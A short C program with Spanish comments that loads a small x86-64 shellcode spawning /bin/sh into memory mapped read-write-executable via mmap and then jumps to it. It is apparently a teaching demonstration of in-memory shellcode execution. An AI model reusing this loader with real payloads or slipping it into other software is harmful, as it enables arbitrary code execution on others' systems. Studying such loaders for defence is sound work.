// simple inyeccion de shellcode en linux asignando memoria con nmap()

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

const char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"; //bin/sh

void ejecutar_shellcode(){
    size_t tam_shellcode = sizeof(shellcode) - 1;

    void* shellcode_mem = mmap(
        NULL,
        tam_shellcode,
        PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    memcpy(shellcode_mem, shellcode, tam_shellcode);

    printf("Tama√±o de la shellcode: %zu bytes\n", tam_shellcode);
    printf("Shellcode asignada desde la direccion: %p\n", shellcode_mem);

        void (*shellcode_ptr)() = (void (*)())shellcode_mem;

        shellcode_ptr();
}

int main() {
    ejecutar_shellcode();
    return 0;
}
